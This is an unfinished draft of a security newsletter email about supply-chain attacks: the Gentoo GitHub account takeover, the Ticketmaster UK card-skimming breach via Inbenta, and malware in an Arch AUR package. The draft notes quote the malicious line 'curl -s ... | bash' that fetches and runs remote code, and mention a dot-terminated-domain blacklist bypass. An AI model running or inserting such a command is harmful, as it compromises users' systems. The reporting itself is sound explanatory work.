---
layout: email
title: Supply-chain attacks: Arch, Gentoo, and Ticketmaster UK
---

Follow-up to previous KATTFAKTA - mention that risk based has the issue where company just accepts risks even if it shouldn’t

ASD follow-up:
https://zdnet.com/article/asd-restructure-trouble-at-t-cyber-mill/
https://asd.gov.au/publications/plans/ASD-Corporate-Plan-2018.pdf
https://warontherocks.com/2018/07/fish-out-of-water-how-the-military-is-an-impossible-place-for-hackers-and-what-to-do-about-it/

NPM hacked:
https://twitter.com/npmstatus/status/1017441729656455168
https://status.npmjs.org/incidents/dn7c1fgrr7ng
https://theregister.co.uk/2018/07/12/npm_eslint/


This commit:
https://aur.archlinux.org/cgit/aur.git/commit/?h=acroread&id=b3fec9f2f16703c2dae9e793f75ad6e0d98509bc

Right at the bottom, the line 
```
curl -s https://ptpb.pw/~x|bash -&
```
has been added 

https://www.bleepingcomputer.com/news/security/malware-found-in-arch-linux-aur-package-repository/



Good morning.

My last email contained a fairly significant typo in the third-last paragraph: 'proscriptive' vs 'prescriptive'. Hopefully most of you knew what I meant!

### Dot-terminating domain names for domain blacklisting

A quick one to start with: Sucuri has an excellent [blog post](https://blog.sucuri.net/2018/07/coinimp-cryptominer-and-fully-qualified-domain-names.html) regarding the use of dot-terminated domain names to bypass domain blacklists. It's a cute trick, and yet another example of why blacklists are a fragile security measure.




### Gentoo's GitHub account hacked

Last week, the Gentoo Linux GitHub project was compromised. From [The Register](https://www.theregister.co.uk/2018/06/28/gentoo_linux_github_hacked/):

>The Linux distro's officials sounded the alarm on Thursday, revealing someone managed to break into its GitHub organization account to modify software and webpages.
>
>Basically, if you downloaded and installed materials from Gentoo via GitHub, you might be compromised by bringing in malicious code. And until the all clear is given, you should avoid fetching anything from the project's 'hub org account.

Gentoo can best be described as a niche Linux distribution: it's premise is that all applications are compiled from source locally, rather than being downloaded as pre-compiled binaries (like traditional software).

Initial predictions regarding the compromise were that a project maintainer's GitHub password had been guessed, and that they must not have had [two-factor authentication](https://help.github.com/articles/about-two-factor-authentication/) enabled. Sure enough, in the follow-up [incident report](https://wiki.gentoo.org/wiki/Project:Infrastructure/Incident_Reports/2018-06-28_Github):

>The attacker gained access to a password of an organization administrator. Evidence collected suggests a password scheme where disclosure on one site made it easy to guess passwords for unrelated webpages.

In other words, the admin had the password `"Kangaroo2017!"` on another site, and `"Kangaroo2018!"` on GitHub. Compromise of the first led to compromise of the second, and a lack of two-factor authentication meant game-over.

This sort of attack is entirely predictable, and the reason that [good password practices](https://markeldo.com/Email-update-Security-trade-offs/) recommend creating unique passwords for every website/service, storing these unique passwords in a password manager, and using two-factor authentication (2FA) wherever you can. 

This has been recommended practice for many years now, and an administrator for a major Linux distribution's GitHub project should have known better. Still, it's impossible to force people to use unique passwords, and it's becoming increasingly obvious that if you don't mandate the use 2FA, users are unlikely to enable it themselves. 

For any non-trivial systems, we as an industry need to stop relying on users being conscientious, and start making these protections mandatory.

### Ticketmaster UK supply-chain attack

Ticketmaster UK has had a bad few weeks. From [The Register](https://www.theregister.co.uk/2018/06/27/ticketmaster_support_bot_hack/):

> "On Saturday, June 23, 2018, Ticketmaster UK identified malicious software on a customer support product hosted by Inbenta Technologies, an external third-party supplier to Ticketmaster," the ticket biz said in a statement.

Inbenta is a provider of the sort of "chat bot" help systems you see on many websites these days. Ticketmaster was embedding Inbenta's code on their payments page, which meant that code had visibility of any credit card details entered by Ticketmaster's customers.

Supply-chain attacks are something we've covered previously (most notably [here](https://markeldo.com/Email-update-The-cabinet-files-and-supply-chain-attacks-at-scale/) and [here](https://markeldo.com/Email-update-Cisco-and-Cryptomining/)), and this is a classic example. Ticketmaster had put Inbenta in a highly privileged position in their system, and the attacker—rather than attacking Ticketmaster directly—compromised Inbenta and leveraged this privileged access to steal credit card details.

Ticketmaster's main fault was putting Inbenta in a priviliged positon they didn't even need, increasing the risk of compromise for no tangible benefit.

From the [statement](https://www.inbenta.com/en/inbenta-and-the-ticketmaster-data-breach/) by the CEO of Inbenta, Jordi Torras:

>Upon further investigation by both parties, it has been confirmed that the source of the data breach was a single piece of JavaScript code, that was customized by Inbenta to meet Ticketmaster’s particular requirements. This code is not part of any of Inbenta’s products or present in any of our other implementations.
>
>Ticketmaster directly applied the script to its payments page, without notifying our team. Had we known that the customized script was being used this way, we would have advised against it, as it incurs greater risk for vulnerability. The attacker(s) located, modified, and used this script to extract the payment information of Ticketmaster customers processed between February and June 2018.

In short, Ticketmaster screwed up

They're 

https://www.troyhunt.com/the-javascript-supply-chain-paradox-sri-csp-and-trust-in-third-party-libraries/
